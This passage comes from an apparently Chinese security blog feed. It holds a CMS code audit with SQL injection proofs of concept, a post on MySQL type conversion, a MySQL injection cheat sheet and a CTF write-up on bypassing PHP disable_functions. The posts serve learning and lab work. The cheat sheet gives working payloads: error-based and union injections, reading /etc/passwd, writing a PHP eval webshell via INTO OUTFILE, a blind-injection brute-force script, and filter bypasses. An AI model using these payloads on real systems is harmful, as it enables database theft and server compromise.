        <content type="html"><![CDATA[<p>九月第一天，加油哇( •̀_•́ )</p><p>记录一下代码审计的分析流程。</p><a id="more"></a><h5 id="1-系统重装漏洞"><a href="#1-系统重装漏洞" class="headerlink" title="1.系统重装漏洞"></a>1.系统重装漏洞</h5><h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><p> 安装完成后未删除<code>install.php</code>文件。</p><h6 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h6><p>定位到<code>install.php</code>，第6行位置</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828092758.png" alt></p><p>判断了是否存在<code>install.lock</code>文件，然后没有下文了。。。可能是开发失误。</p><h6 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><p>安装完成</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828093141.png" alt></p><p>然后访问<code>install.php</code> 可以重装</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828093215.png" alt></p><h5 id="2-后台xss-滑稽"><a href="#2-后台xss-滑稽" class="headerlink" title="2.后台xss(滑稽)"></a>2.后台xss(滑稽)</h5><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828101752.png" alt></p><h5 id="3-sql语句暴露"><a href="#3-sql语句暴露" class="headerlink" title="3.sql语句暴露"></a>3.sql语句暴露</h5><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828153436.png" alt></p><h5 id="4-后台sql注入-鸡肋"><a href="#4-后台sql注入-鸡肋" class="headerlink" title="4.后台sql注入(鸡肋)"></a>4.后台sql注入(鸡肋)</h5><h6 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><p>访问<code>url:</code> <code>http://127.0.0.1/uqcms/index.php/admin/ad/save</code></p><p>post提交数据 <code>alias=1#&amp;id=1 and updatexml(1,concat(0x7e,(select/**/user()),0x7e),1)#&amp;name=2&amp;px=0</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828160305.png" alt></p><h6 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h6><p><code>admin/ad_class.php</code> 第62行</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828161448.png" alt></p><p>通过P函数获取id的值，跟进P函数</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828161531.png" alt></p><p>因为传入的是<code>false</code>,去掉空格后直接返回，没有任何过滤。</p><h5 id="5-前台sql注入"><a href="#5-前台sql注入" class="headerlink" title="5. 前台sql注入"></a>5. 前台sql注入</h5><h6 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h6><p>需要注册一个会员账号，</p><p>在修改收货地址处抓包，修改id参数，id参数未过滤，可报错注入，得到数据。</p><h6 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190829140746.png" alt></p><h6 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h6><p><code>home/address.class.php</code> 文件，第35行位置</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190829141016.png" alt></p><p>通过P函数获取后直接传入sql语句进行查询。</p><p>sql注入在这套cms里应该是不少…，以上只是举个例子，开发者把希望寄托在了<code>360_safe.php</code>提供的过滤规则上… ，虽然过滤大部分，但是没有过滤报错函数，POST方式没有过滤单引号。</p><h5 id="6-文件上传"><a href="#6-文件上传" class="headerlink" title="6. 文件上传"></a>6. 文件上传</h5><p>本地上传正常图片也不行，没进一步测试，附上先知社区大佬分析</p><p><a href="https://xz.aliyun.com/t/6075" target="_blank" rel="noopener">https://xz.aliyun.com/t/6075</a></p><h5 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h5><p>代码审计的能力太弱，希望自己能坚持下去，写成一个系列文章吧！</p>]]></content>
      
      
      <categories>
          
          <category> code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql隐式类型转换及其安全问题</title>
      <link href="/2019/08/25/fasle-mysql-injection/"/>
      <url>/2019/08/25/fasle-mysql-injection/</url>
      
        <content type="html"><![CDATA[<p>测试时发现的一点小问题。</p><a id="more"></a><p>所谓的隐式类型转换，就是在不使用转换函数的情况下，默认转换了类型，比方说定义一个<code>varchar</code>变量<code>id</code>，传入了一个非预期类型的值，就会转换类型然后带入语句查询。说到底是忽略了不同数据类型之间是否兼容。</p><p>隐式类型转换有时会导致无法使用索引的风险，尤其是在高并发的情况下，不走索引就会全盘搜索，进行N多次I/O操作，占用很多资源而且浪费时间。</p><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><p>看一下转换规则：</p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html" target="_blank" rel="noopener">mysql官方文档</a></p><p>翻译过来的规则如下(半机翻)：</p><ul><li>如果是一个或两个参数<code>NULL</code>，则比较的结果是<code>NULL</code>，除了<code>NULL</code>-safe <a href="https://dev.mysql.com/doc/refman/5.7/en/comparison-operators.html#operator_equal-to" target="_blank" rel="noopener"><code>&lt;=&gt;</code></a> 等式比较运算符。因为<code>NULL &lt;=&gt; NULL</code>，结果是真的。无需转换。</li><li>如果比较操作中的两个参数都是字符串，则将它们作为字符串进行比较。</li><li>如果两个参数都是整数，则将它们作为整数进行比较。</li><li>如果不与数字进行比较，十六进制值将被视为二进制字符串。</li><li>如果其中一个参数是<code>TIMESTAMP</code> 或<code>DATETIME</code>列而另一个参数是常量，则在执行比较之前将常量转换为时间戳。</li><li>有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较.</li><li>所有其他情况下，两个参数都会被转换为浮点数再进行比较.</li></ul><h4 id="测试实例"><a href="#测试实例" class="headerlink" title="测试实例"></a>测试实例</h4><p><code>test_table</code>表中有<code>username</code>字段，<code>varchar</code>类型</p><p><fancybox><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190825151001.png" alt></fancybox></p><p>正常情况下：</p><fancybox><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190825151108.png" alt></p></fancybox><p></p><p>当我们输入0时，</p><p><fancybox><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190825151353.png" alt></fancybox></p><p>会返回全部的数据，这是为什么？</p><p>看上边的规则，最后一条，其他情况下，会转换成浮点数进行比较，字符串转浮点数会失败，就像php弱类型一样，mysql有没有类似的机制呢？尝试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1=&apos;aaa&apos;,1=&apos;1aaa&apos;,1=&apos;2aaa&apos;,1=&apos;123aaa&apos;,1=1.0;</span><br><span class="line">+---------+----------+----------+------------+-------+</span><br><span class="line">| 1=&apos;aaa&apos; | 1=&apos;1aaa&apos; | 1=&apos;2aaa&apos; | 1=&apos;123aaa&apos; | 1=1.0 |</span><br><span class="line">+---------+----------+----------+------------+-------+</span><br><span class="line">|       0 |        1 |        0 |          0 |     1 |</span><br><span class="line">+---------+----------+----------+------------+-------+</span><br><span class="line">1 row in set, 4 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1=&apos;aaa&apos;,1=&apos;1aaa&apos;,2=&apos;2aaa&apos;,123=&apos;123aaa&apos;,1=1.0;</span><br><span class="line">+---------+----------+----------+--------------+-------+</span><br><span class="line">| 1=&apos;aaa&apos; | 1=&apos;1aaa&apos; | 2=&apos;2aaa&apos; | 123=&apos;123aaa&apos; | 1=1.0 |</span><br><span class="line">+---------+----------+----------+--------------+-------+</span><br><span class="line">|       0 |        1 |        1 |            1 |     1 |</span><br><span class="line">+---------+----------+----------+--------------+-------+</span><br><span class="line">1 row in set, 4 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2 = &apos;a2&apos;;</span><br><span class="line">+----------+</span><br><span class="line">| 2 = &apos;a2&apos; |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><p>从上边可以看出，字符串转成浮点数时会失败，如果字符串开头为数字，会在字母处截断，只取数字作为转换后的结果，所以<code>username=0</code>时会返回所有的结果，因为插入的数据都不是以数字开头的，转换时都会转成0，0=0，满足条件所以输出。</p><h4 id="sql注入中的利用"><a href="#sql注入中的利用" class="headerlink" title="sql注入中的利用"></a>sql注入中的利用</h4><p>查了查资料，有大佬已经总结过了，陕西省网络安全大赛中出过一道这样的题目，详情可以看<a href="https://www.anquanke.com/post/id/86021" target="_blank" rel="noopener">这里</a></p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html</a></p><p><a href="https://www.anquanke.com/post/id/86021" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86021</a></p><p><a href="https://www.cnblogs.com/rollenholt/p/5442825.html" target="_blank" rel="noopener">https://www.cnblogs.com/rollenholt/p/5442825.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql注入备忘录(不断更新...)</title>
      <link href="/2019/08/22/mysql-injection-guide/"/>
      <url>/2019/08/22/mysql-injection-guide/</url>
      
        <content type="html"><![CDATA[<p>记录一下<code>mysql</code>手工注入语句，随拿随用。</p><a id="more"></a><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h5><ul><li><code>version()</code></li><li><code>@@version //@@</code>是系统变量</li></ul><h5 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h5><ul><li><code>database()</code></li><li><code>schema()</code></li></ul><h5 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h5><ul><li><code>user()</code></li><li><code>current_user()</code></li><li><code>system_user()</code></li></ul><h5 id="查看路径"><a href="#查看路径" class="headerlink" title="查看路径"></a>查看路径</h5><ul><li><code>select @@basedir</code></li></ul><h5 id="字符串相关"><a href="#字符串相关" class="headerlink" title="字符串相关"></a>字符串相关</h5><ul><li><code>length()</code></li><li><code>concat()</code> //连接字符串</li><li><code>concat_ws(flag,s1,s2...)</code> //同<code>concat</code>函数，每个字符要加上<code>flag</code></li><li><code>left(s,n)</code> //返回s开始的最左边n个字符</li><li><code>right(s,n)</code>  //返回s开始的最右边的n个字符</li><li><code>repeat(s,n)</code> //重复字符串s n次</li><li><code>substring(s,n,len)</code>  //获取字符串s从n开始长度为<code>len</code>的字符串</li><li><code>mid(s,n,len)</code>   //同上sub</li><li><code>ascii(s)</code>  // 获取s的<code>ascii</code>值</li><li><code>group_concat()</code> //连接字符串</li></ul><h5 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h5><p><code>if(expr,v1,v2)</code>  // 如果表达式成立，执行<code>v1</code>，否则执行<code>v2</code></p><p><code>case when then</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">case expr</span><br><span class="line">when case1 then 1</span><br><span class="line">when case2 then 2</span><br><span class="line">else 3</span><br><span class="line">end case</span><br></pre></td></tr></table></figure><h4 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h4><ul><li><p>有回显的普通注入</p></li><li><p>报错注入(有回显)</p></li><li><p>头注入(<code>X-Forwarded-For/UA头/cookie注入/...</code>)</p></li><li><p><code>insert</code>注入</p></li><li><p><code>update</code>注入  // 一般为报错注入</p></li><li><p><code>delete</code> 注入 </p></li><li><p>宽字节注入</p></li><li><p>盲注</p><ul><li><p>布尔盲注</p><p>根据返回结果的差异来判断</p></li><li><p>时间盲注</p><p>根据是否延时来判断条件是否成立</p></li></ul></li><li><p>二次注入</p><ul><li><code>insert + select</code>类型</li><li><code>update + select</code>类型</li><li>…</li></ul></li><li><p><code>order by</code>注入</p></li></ul><h4 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h4><ul><li><p>字符型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id =1&apos; and &apos;1&apos;=&apos;1 #</span><br><span class="line">id =1&apos; and &apos;1&apos;=&apos;2 #</span><br><span class="line">id =1&apos; or &apos;1&apos;=&apos;1 #</span><br><span class="line">id =1&apos; or &apos;1&apos;=&apos;2 #</span><br><span class="line"> &apos;  &quot; &apos;) &quot;)   //常见闭合方式</span><br></pre></td></tr></table></figure></li><li><p>数字型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and 1 =1 #</span><br><span class="line">id = 2 and 1= 2 #</span><br><span class="line">id = 1 or 1 = 1 #</span><br><span class="line">id = 2 or 1 = 2 #</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h4><h5 id="有回显普通手工注入"><a href="#有回显普通手工注入" class="headerlink" title="有回显普通手工注入"></a>有回显普通手工注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">id = 1 order by 3#  // 条件为真，才能进行order by 查询</span><br><span class="line">id = -1 union select 1,2,3 # //前面条件为假，而且前后查询列数要相等</span><br><span class="line"></span><br><span class="line">SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA #</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database_name #</span><br><span class="line">SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=table_name # </span><br><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM database_name.table_name #</span><br><span class="line">SELECT load_file(&apos;/etc/passwd&apos;)</span><br><span class="line">SELECT &apos;&lt;?php @eval($_POST[1]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;;</span><br><span class="line">show variables like &apos;%secure%&apos;; // 查看权限</span><br><span class="line">secure_file_priv=  可以读取目录</span><br><span class="line">secure_file_priv=NULL 不能读取</span><br><span class="line">secure_file_priv=C:\  只能读取C盘</span><br></pre></td></tr></table></figure><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><h6 id="updatexml-长度限制-32位"><a href="#updatexml-长度限制-32位" class="headerlink" title="updatexml(长度限制 32位)"></a>updatexml(长度限制 32位)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select database()),0x7e),1))</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;test&apos;),0x7e),1))</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;user&apos;),0x7e),1))</span><br><span class="line"> id=1 and (updatexml(1,concat(0x7e,(select group_concat(password) from user),0x7e),1))</span><br></pre></td></tr></table></figure><h6 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * from(select group_concat(table_name) from information_schema.tables where !(table_schema &lt;&gt; database()))a)) or &apos;</span><br></pre></td></tr></table></figure><h6 id="extractvaluel-长度限制-32位"><a href="#extractvaluel-长度限制-32位" class="headerlink" title="extractvaluel(长度限制 32位)"></a>extractvaluel(长度限制 32位)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;test&apos;),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;user&apos;),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select group_concat(password) from user),0x7e)))</span><br></pre></td></tr></table></figure><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p><code>BENCHMARK(100000,MD5(1)) or sleep(5)</code></p><p>附上一个半成品吧，根据情况定制payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">result = &apos;&apos;</span><br><span class="line">flag=the symbol of successful_data</span><br><span class="line">url = &quot;http:/xxx.com/index.php&quot;</span><br><span class="line">request = requests.session()</span><br><span class="line">prox = &#123;&quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;</span><br><span class="line">header=&#123;</span><br><span class="line"></span><br><span class="line">&quot;Host&quot;: &quot;test.dns.outnet&quot;,</span><br><span class="line">&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&quot;,</span><br><span class="line">&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    &quot;username&quot;:&quot;admin&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in range(23,126):</span><br><span class="line"></span><br><span class="line">        payload = &quot; &apos; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=the_name_of_table),&#123;0&#125;,1))=&#123;1&#125;  # &quot;.format(i,j)</span><br><span class="line">        #payload = &quot; &apos; or ascii(substr((select a from b),&#123;0&#125;,1))=&#123;1&#125;  # &quot;.format(i,j)</span><br><span class="line">        response = request.post(url=url,data=data,proxies=prox)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        if flag in response.text:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            print(t)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h5 id="DNSlog无回显注入"><a href="#DNSlog无回显注入" class="headerlink" title="DNSlog无回显注入"></a>DNSlog无回显注入</h5><p>没实践过，先记一下。</p><p><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/8047530.html</a></p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><h5 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/**/ /*!*/</span><br><span class="line"></span><br><span class="line">union/**/select</span><br><span class="line">/*！union*/select</span><br></pre></td></tr></table></figure><h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><p>双写或者大小绕过</p><p><code>e.g:</code></p><p><code>Uniunionon</code> <code>SeleSElectct</code></p><h5 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h5><p>使用<code>join</code>函数代替</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3</span><br><span class="line">select (select 1)a join (select 2)b join (select 3)c</span><br></pre></td></tr></table></figure><h5 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h5><p>使用十六进制编码</p><h5 id="正则匹配最大次数限制"><a href="#正则匹配最大次数限制" class="headerlink" title="正则匹配最大次数限制"></a>正则匹配最大次数限制</h5><p>绕某些<code>WAF</code>时有奇效</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><h4 id="杂七杂八"><a href="#杂七杂八" class="headerlink" title="杂七杂八"></a>杂七杂八</h4><p>查询字段名为关键字时需要使用反引号转义</p><p>数据库数据可能存在宽字节，需要转成十六进制再转成十进制。</p><p>….</p><p>推荐破哥总结的注入笔记，破哥出品，必定精品~</p><p><a href="https://p0sec.net/index.php/archives/117/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/117/</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个shell引发的思考</title>
      <link href="/2019/08/18/shell-analy/"/>
      <url>/2019/08/18/shell-analy/</url>
      
        <content type="html"><![CDATA[<h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p>最近在做内部靶场平台题目，其中一道题为爆破一句话木马，拿到key的值。</p><a id="more"></a><h4 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h4><p>木马密码可以通过burp爆破得到</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818120456.png" alt></p><p>祭出菜刀，连上一句话，发现权限被限制的很死，基本关于文件操作以及命令执行的函数都被禁用了..</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818120834.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818120911.png" alt></p><p>但是没有禁用<code>file_get_contents</code>函数，所以可以直接读取文件获得key。</p><p>如果在实际中遇到这种环境，函数被禁，怎么绕过<code>disable_function</code>？</p><p>绕过姿势，一般有这么几种：</p><ul><li><p>寻找未被禁用的函数</p></li><li><p>系统组件绕过</p></li><li><p>通过<code>LD_PRELOAD</code>绕过</p></li><li><p><code>mod-cgi</code> 绕过</p></li><li><p>执行自定义语句(自己实现函数功能，通过<code>webshell</code>执行)</p></li></ul><h5 id="第一种-敏感函数"><a href="#第一种-敏感函数" class="headerlink" title="第一种  敏感函数"></a>第一种  敏感函数</h5><p>整理一下经常用的各类函数，方便查找。</p><p><code>php</code>中读取文件可以使用以下函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">readfile</span><br><span class="line">fread</span><br><span class="line">file_get_contents</span><br><span class="line">var_dump(file(file_name)) // file函数返回值位数组</span><br><span class="line">show_source</span><br><span class="line">hightlight_file</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>在<code>php</code>中可以执行命令函数有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,exec,shell_exec,passthru，pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link</span><br></pre></td></tr></table></figure><p>列目录函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">opendir</span><br><span class="line">scandir</span><br><span class="line">glob(&apos;*&apos;) </span><br><span class="line">$path = dirname(__FILE__);</span><br><span class="line">$result = glob($path.&apos;/*.php&apos;);</span><br><span class="line">print_r($result);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="第二种-三方组件"><a href="#第二种-三方组件" class="headerlink" title="第二种 三方组件"></a>第二种 三方组件</h5><p>利用系统存在的组件漏洞执行命令，扩大战果。</p><ul><li>Bash漏洞导致命令执行</li><li><code>ImageMagic</code>绕过</li><li><code>imagecreatefromgd2</code></li><li><code>sendmail</code> </li></ul><h5 id="第三种-LD-PRELOAD"><a href="#第三种-LD-PRELOAD" class="headerlink" title="第三种 LD_PRELOAD"></a>第三种 LD_PRELOAD</h5><p>使用<code>LD_PRELOAD</code></p><p>程序执行时要在动态链接库<code>.so</code>中寻找函数位置，这种绕过方式就是让程序去执行自定义的动态链接库，类似于<code>mysql</code>下的<code>udf</code>提权或者<code>redis</code>主从复制<code>RCE</code>方式。</p><p><code>LD_PRELOAD</code>这个全局变量指定动态链接库文件，会在程序运行之前加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD = XXX/xx.so</span><br></pre></td></tr></table></figure><p>如果可以上传文件，我们可以通过上传一个恶意的.so库文件，然后加载该文件。最后绕过<code>php</code>层面执行命令函数。</p><p>推荐一个复现环境：</p><p><a href="https://github.com/obolu/Bypass_Disable_functions" target="_blank" rel="noopener">https://github.com/obolu/Bypass_Disable_functions</a></p><h5 id="第四种-mod-cgi-htaccess"><a href="#第四种-mod-cgi-htaccess" class="headerlink" title="第四种  mod_cgi+.htaccess"></a>第四种  mod_cgi+.htaccess</h5><p>在启用<code>mod_cgi</code>的apache服务器中，必须允许<code>.htaccess</code>以及有可写权限，要求有点苛刻。</p><p>在apache配置中有<code>Options</code>以及<code>Addhandler</code>指令，前者用来控制目录选项，比方说是否允许目录遍历，是否允许访问等，后者用来指定特定后缀名的文件所对应的处理方式，在解析漏洞中就有这样的用法，上传带少见后缀的恶意文件，修改<code>.htaccess</code>文件达到执行代码的目的。</p><p>这种绕过方式就是通过将要执行的程序写入带有特定拓展名的文件内，修改<code>.htaccess</code>文件，将恶意文件交给<code>cgi</code>处理。</p><p>具体的原理可以查阅 <a href="https://www.cnblogs.com/hookjoy/p/8988862.html" target="_blank" rel="noopener">https://www.cnblogs.com/hookjoy/p/8988862.html</a></p><h5 id="第五种-自定义语句"><a href="#第五种-自定义语句" class="headerlink" title="第五种 自定义语句"></a>第五种 